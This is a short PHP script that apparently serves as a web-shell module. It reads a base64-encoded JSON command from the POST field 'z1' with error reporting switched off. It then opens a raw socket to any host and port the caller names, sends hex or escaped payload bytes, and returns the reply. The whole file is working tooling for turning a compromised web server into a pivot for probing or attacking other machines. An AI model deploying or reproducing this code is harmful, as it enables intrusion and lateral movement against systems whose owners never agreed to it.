<?php

error_reporting(0);

$json_pattern = json_decode(base64_decode($_POST['z1']), true);

$host = isset($json_pattern["host"]) ? $json_pattern["host"] : "";
$port = isset($json_pattern["port"]) ? (int)$json_pattern["port"] : 0;
$dataType = isset($json_pattern["type"]) ? $json_pattern["type"] : "text";
$rawData = isset($json_pattern["data"]) ? $json_pattern["data"] : "";

function fnHexStringToByteArray($szHexStr) {
    if (empty($szHexStr)) {
        return "";
    }

    $szClean = preg_replace('/[\\\\,ox\s\r\n]/i', '', $szHexStr);
    
    if (strlen($szClean) % 2 != 0) {
        $szClean .= "0";
    }

    return pack("H*", $szClean);
}

function fnUnescapeData($str) {
    return stripcslashes($str);
}

function main() {
    global $host, $port, $dataType, $rawData;

    if (empty($host) || empty($port)) {
        echo("[-] ERROR: Missing target host or port.\n");
        return;
    }

    if (strcasecmp($dataType, "hex") === 0) {
        $sendBuffer = fnHexStringToByteArray($rawData);
    } else {
        $sendBuffer = fnUnescapeData($rawData);
    }

    $socket = @fsockopen($host, $port, $errno, $errstr, 3);
    if (!$socket) {
        echo("[-] ERROR: Connection Timeout or Failed ($errstr).\n");
        return;
    }

    echo("[*] CONNECTING TO TARGET HOST SUCCESSFUL...\n");

    stream_set_timeout($socket, 3);
    fputs($socket, $sendBuffer);
    $responseText = fgets($socket, 4096);
    $info = stream_get_meta_data($socket);
    
    if ($info['timed_out']) {
        echo("[+] SUCCESS: Packet transmitted, but host response timed out.\n");
    } elseif (!empty($responseText)) {
        echo("[+] RESPONSE:\n" . $responseText . "\n");
    } else {
        echo("[+] SUCCESS: Packet transmitted, but no data returned from host.\n");
    }

    fclose($socket);
}

main();

?>